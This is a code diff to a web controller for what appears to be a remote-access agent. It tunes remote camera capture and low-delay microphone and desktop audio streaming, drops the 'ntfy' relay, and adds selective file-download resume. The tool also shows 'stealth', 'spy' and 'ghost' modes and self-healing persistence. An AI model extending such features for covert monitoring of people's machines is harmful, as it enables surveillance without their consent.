@@ -343,6 +343,7 @@ html{touch-action:manipulation}
         <span style="font-size:13px;font-weight:600">📷 Remote Camera</span>
         <select id="camDeviceSel" class="select" title="Camera device (driver index)"><option value="0">Camera 0 (default)</option><option value="1">Camera 1</option><option value="2">Camera 2</option><option value="3">Camera 3</option></select>
         <select id="camQualSel" class="select" title="JPEG quality"><option value="40">q40</option><option value="60" selected>q60</option><option value="80">q80</option><option value="90">q90</option></select>
+        <select id="camWidthSel" class="select" title="Frame width (Auto: 320px on relay, 640px direct)"><option value="auto" selected>Auto width</option><option value="320">320px</option><option value="640">640px</option><option value="1280">1280px</option></select>
         <button class="btn btn-primary btn-small" id="camSnapBtn">📸 Snap</button>
         <span id="camTabStatus" style="font-size:11px;color:#888"></span>
         <button class="btn btn-small" id="camTabSave" style="margin-left:auto">⤓ Save</button>
@@ -409,6 +410,7 @@ html{touch-action:manipulation}
           <div style="display:flex;gap:8px"><button class="btn btn-primary btn-small" data-src="desktop">🖥 Desktop</button><button class="btn btn-small" data-src="mic">🎤 Mic</button><button class="btn btn-small" data-src="both">Both</button></div>
           <div style="margin-top:12px"><label style="font-size:11px;color:#888">Remote device (controlled PC)</label><select id="audioDev" class="select" style="width:100%;margin-top:6px"><option value="">Default</option></select><button class="btn btn-small" id="audioRefresh" style="margin-top:6px">⟳ Refresh remote</button></div>
           <div style="margin-top:12px;display:flex;gap:8px"><button class="btn btn-primary btn-small" id="aStart">▶ Start</button><button class="btn btn-small" id="aStop" disabled>■ Stop</button><button class="btn btn-small" id="aMute">🔇 Mute</button><button class="btn btn-small" id="aBeep" title="Play a test beep on the controlled PC">🔔 Beep remote</button></div>
+          <div style="margin-top:8px"><label class="toggle" id="audioLowDelayToggle" title="Stream every 25ms block immediately instead of batching pairs (lowest delay, ~2x MQTT messages)"><input type="checkbox"/> Low-delay audio</label></div>
         </div>
         <div class="audio-card">
           <h4>Remote output <span style="font-size:10px;color:#666">(controlled PC)</span></h4>
@@ -487,7 +489,7 @@ function renderConns(filter=""){
     const seen=off?(" • "+seenText(a.seenAgoSec)):("");
     d.className="conn-item"+(selected?.id===a.id?" active":"")+(off?" offline":"");
     const lat = (a.latency==null||a.latency>900000) ? "--" : a.latency;
-    const ver=a.version?` • ${a.version}`:""; const upd=a.outdated?` <span style="color:#FFD54F" title="Outdated — click Update All">⇪</span>`:""; const prot=protOK(a.version)?` <span title="Self-healing protection: dual backup + watchdog + health heartbeat${a.prot?` • layers ${a.prot}`:""}">🛡</span>`:""; const rb=a.rollbackBad?` <span style="color:#FF5252" title="Rolled back: v${a.rollbackBad} crashed, restored v${a.rollbackTo||"?"} — that version is held back from future pushes">⚠️</span>`:""; const ut=a.untrusted?` <span title="No registration token (untrusted) — enforce tokens in Settings to lock such agents out">🔓</span>`:""; const md=(a.mode&&a.mode!=="normal")?` <span style="color:#CE9178" title="Operation mode: ${a.mode}">${a.mode==="stealth"?"🥷":a.mode==="spy"?"🕵️":a.mode==="ghost"?"👻":a.mode==="performance"?"🚀":a.mode==="kiosk"?"🖥️":"📖"}</span>`:"";
+    const ver=a.version?` • ${a.version}`:""; const upd=a.updateRequired?` <span style="color:#FF5252" title="REQUIRED update (pre-1.45, ntfy path dead) — push update now">⇪!</span>`:a.outdated?` <span style="color:#FFD54F" title="Outdated — click Update All">⇪</span>`:""; const prot=protOK(a.version)?` <span title="Self-healing protection: dual backup + watchdog + health heartbeat${a.prot?` • layers ${a.prot}`:""}">🛡</span>`:""; const rb=a.rollbackBad?` <span style="color:#FF5252" title="Rolled back: v${a.rollbackBad} crashed, restored v${a.rollbackTo||"?"} — that version is held back from future pushes">⚠️</span>`:""; const ut=a.untrusted?` <span title="No registration token (untrusted) — enforce tokens in Settings to lock such agents out">🔓</span>`:""; const md=(a.mode&&a.mode!=="normal")?` <span style="color:#CE9178" title="Operation mode: ${a.mode}">${a.mode==="stealth"?"🥷":a.mode==="spy"?"🕵️":a.mode==="ghost"?"👻":a.mode==="performance"?"🚀":a.mode==="kiosk"?"🖥️":"📖"}</span>`:"";
     d.innerHTML=`<span class="conn-dot ${a.connected?"dot-online":"dot-offline"}"></span><div class="conn-meta"><div class="conn-name">${a.hostname}${upd}${prot}${rb}${ut}${md}</div><div class="conn-sub">${a.id} • ${a.user}${a.remote?" • "+a.remote:""}${a.e2e?" • 🔒":""}${ver}${seen}</div></div>${off?'<span class="forgetbtn" title="Forget (remove from controller)" style="font-size:11px;color:#888;cursor:pointer;padding:2px 4px">✕</span>':""}<span class="copybtn" title="Copy hostname" style="font-size:11px;color:#888;cursor:pointer;padding:2px 4px">⧉</span><span class="conn-lat">${lat}ms</span>`;
     d.onclick=()=>{selected=a; renderConns($("connFilter").value); updateActive(); renderDeviceSwitch(); if(typeof updateConnButtons==="function") updateConnButtons();};
     d.ondblclick=()=>{selected=a; renderConns($("connFilter").value); updateActive(); renderDeviceSwitch(); if(typeof updateConnButtons==="function") updateConnButtons(); const cb=$("connectBtn"); if(cb&&cb.onclick) cb.onclick();};
@@ -972,6 +974,9 @@ function pushAgentUpdateAll(){
     .catch(e=>addTerm("Update All failed: "+(e.message||e), "err"));
 }
 $("pushUpdateAllBtn").onclick=pushAgentUpdateAll;
+// Audio stream command: appends lowdelay when the toggle is on (batch=1,
+// lowest delay, ~2x MQTT messages). Default batches block pairs.
+function audioStreamCmd(){ const ld=document.querySelector("#audioLowDelayToggle input")?.checked?" lowdelay":""; return "start-audio-stream "+audioSrc+ld; }
 // Token-guarded permanent self-delete: arm → nonce (masked) → confirm.
 // kill-agent only quiets the process; this removes everything forever.
 let pendingDeleteArm=null;
@@ -1169,7 +1174,7 @@ $("addCmdFav").onclick=()=>{
 let streaming=false, lastFrameAt=0, streamWatch=null, nextShotTimer=null, streamPaused=false, streamSuspended=false;
 let pipeDepth=3, inflight=0, lastFSeq=0;
 // Shared 20-lane budget: 10 screen / 10 files baseline; the idle side's
-// lanes go to whoever is active. ntfy always stays serial (rate limits).
+// lanes go to whoever is active.
 const LANES_TOTAL=20, LANES_SPLIT=10;
 function screenActive(){ return streaming && !streamSuspended; }
 function fileActive(){ try{ return (typeof ulActive!=="undefined"&&ulActive>0)||(typeof dlSession!=="undefined"&&dlSession!==null)||(typeof dlQueue!=="undefined"&&dlQueue.length>0); }catch{ return false; } }
@@ -1236,7 +1241,7 @@ function remoteOf(id){
 }
 function isRelay(a){
   const r=(a&&a.remote)||remoteOf(a&&a.id);
-  return r==="mqtt"||r==="ntfy";
+  return r==="mqtt";
 }
 function streamScale(){
   // Detail: full-res on fast links, half-res on relay links (4x smaller
@@ -1478,13 +1483,16 @@ function camShot(qual, dev){
   if(!needAgent()) return;
   const d=(dev!==undefined?dev:($("camDeviceSel")?.value||0));
   const q=(qual!==undefined?qual:($("camQualSel")?.value||60));
+  // Relay links default to 320px (single small publish); direct keeps 640.
+  let w=$("camWidthSel")?.value||"auto";
+  if(w==="auto") w=((selected&&(selected.remote==="mqtt"))?320:640);
   const targetBody=$("camTabBody")||$("camBody");
   const targetStatus=$("camTabStatus")||$("camStatus");
   if(targetBody) targetBody.innerHTML="Loading…";
   if(targetStatus) targetStatus.textContent="Requesting camera "+d+"…";
   // also open tab if not already
   document.querySelector('.tab[data-tab="camera"]')?.click();
-  sendCmdVal("camera-shot "+d+" "+q); addTerm("Camera "+d+" shot @ q"+q+"…","out");
+  sendCmdVal("camera-shot "+d+" "+q+" "+w); addTerm("Camera "+d+" shot @ q"+q+" "+w+"px…","out");
 }
 $("camRefresh")?.addEventListener("click", ()=>camShot());
 $("camClose")?.addEventListener("click", ()=>{ $("camOverlay").style.display="none"; });
@@ -1548,7 +1556,7 @@ $("showTokenBtn").onclick=()=>{
   }).catch(e=>addTerm("Token fetch failed: "+(e.message||e),"err"));
 };
 
-$("audioStart").onclick=()=>{ if(!selected){ toast("No agent", "err"); return; } sendCmdVal("get-audio-devices"); sendCmdVal("start-audio-stream "+audioSrc); addConsole("Audio streaming requested ("+audioSrc+") — plays on your ["+localOutName()+"] (~1s delay)"); $("audioStart").disabled=true; $("audioStop").disabled=false; };
+$("audioStart").onclick=()=>{ if(!selected){ toast("No agent", "err"); return; } sendCmdVal("get-audio-devices"); sendCmdVal(audioStreamCmd()); addConsole("Audio streaming requested ("+audioSrc+") — plays on your ["+localOutName()+"] (~250ms delay)"); $("audioStart").disabled=true; $("audioStop").disabled=false; };
 $("audioStop").onclick=()=>{ if(selected) sendCmdVal("stop-audio-stream"); stopLocalPlayback(); addConsole("Audio stream stopped"); $("audioStart").disabled=false; $("audioStop").disabled=true; };
 $("muteBtn").onclick=()=>{ if(!selected) return; sendCmdVal("set-mic-mute on"); addConsole("Mute toggled"); };
 $("volSlider").oninput=e=>{ $("volLabel").textContent=e.target.value+"%"; };
@@ -1888,8 +1896,8 @@ function b64ToBytes(b64){ const s=atob(b64||""); const b=new Uint8Array(s.length
 async function sha256hex(bytes){ const d=await crypto.subtle.digest("SHA-256",bytes); return [...new Uint8Array(d)].map(x=>x.toString(16).padStart(2,"0")).join(""); }
 function setXfer(pct,label){ $("transferBar").style.width=pct+"%"; $("transferLabel").textContent=label; }
 // Chunk sizes mirror the controller's fileChunkRaw table — keep in sync.
-function xferChunkRaw(a){ const r=(a&&a.remote)||""; if(r==="mqtt") return 128*1024; if(r==="ntfy") return 2*1024; return 512*1024; }
-function xferPace(a){ const r=(a&&a.remote)||""; if(r==="ntfy") return 150; if(r==="mqtt") return 5; return 0; }
+function xferChunkRaw(a){ const r=(a&&a.remote)||""; if(r==="mqtt") return 128*1024; return 512*1024; }
+function xferPace(a){ const r=(a&&a.remote)||""; if(r==="mqtt") return 5; return 0; }
 function fileVia(){ const el=$("fileViaSel"); return el?el.value:""; }
 let dlSession=null; // {id,path,saveName,total,size,sha,chunks:Map,retries,timer,mode,kind}
 let dlQueue=[]; // queued browser downloads {path,saveName}
@@ -1921,8 +1929,16 @@ function armDlGap(){
     if(first<0){ finishDownload(); return; }
     if(dlSession.retries>=3){ toast("Download stalled — missing chunks after retries","err"); addTerm(`Download ${dlSession.path}: stalled at chunk ${first}/${dlSession.total}`,"err"); dlSession=null; setXfer(0,""); pumpDlQueue(); return; }
     dlSession.retries++;
-    addTerm(`Download gap at chunk ${first} — re-requesting…`,"out");
-    ws.send(JSON.stringify({type:"file-dl-more",target:dlSession.id,path:dlSession.path,fromSeq:first,via:fileVia(),thumb:!!dlSession.thumb}));
+    // Selective resume: tell the agent exactly which ranges we hold so it
+    // re-sends only the holes instead of a fromSeq..end suffix.
+    let spans=[], rs=-1, re=-1;
+    for(let i=0;i<dlSession.total;i++){
+      if(dlSession.chunks.has(i)){ if(rs<0){ rs=i; re=i; } else re=i; }
+      else if(rs>=0){ spans.push(rs===re?`${rs}`:`${rs}-${re}`); rs=-1; }
+    }
+    if(rs>=0) spans.push(rs===re?`${rs}`:`${rs}-${re}`);
+    addTerm(`Download gap at chunk ${first} — re-requesting ${dlSession.total-first} missing…`,"out");
+    ws.send(JSON.stringify({type:"file-dl-more",target:dlSession.id,path:dlSession.path,fromSeq:first,have:spans.join(","),via:fileVia(),thumb:!!dlSession.thumb}));
     armDlGap();
   },3000);
 }
@@ -1962,10 +1978,10 @@ function pumpDlQueue(){
 }
 let pendingUpload=null; // {path,resolve} — completed by the output branch
 async function pushChunks(target, dst, b64s, pace, tag){
-  // Shared 10-lane budget: 5 files while the screen runs, 10 when it
-  // doesn't (or is suspended off-tab). ntfy stays serial (rate limits).
+  // Shared lane budget: half while the screen runs, full when it
+  // doesn't (or is suspended off-tab).
   // Agent writes by offset, so lane order is free.
-  const lanes=(selected&&selected.remote==="ntfy")?1:fileLanes();
+  const lanes=fileLanes();
   let next=0, done=0;
   async function lane(){
     while(true){
@@ -2478,7 +2494,7 @@ $("aStart")?.addEventListener("click", ()=>{
   if(!selected){ toast("No agent", "err"); return; }
   sendCmdVal("get-audio-devices");
   if(!document.querySelector("#audioMonToggle input")?.checked) document.querySelector("#audioMonToggle")?.click();
-  sendCmdVal("start-audio-stream "+audioSrc);
+  sendCmdVal(audioStreamCmd());
   addTerm(`Audio monitor started — bars follow remote sound; streaming ${audioSrc} to your [${localOutName()}]`, "out");
   $("audioStatus").textContent=`Streaming ${audioSrc} → ${localOutName()}…`;
   $("aStart").disabled=true; $("aStop").disabled=false;
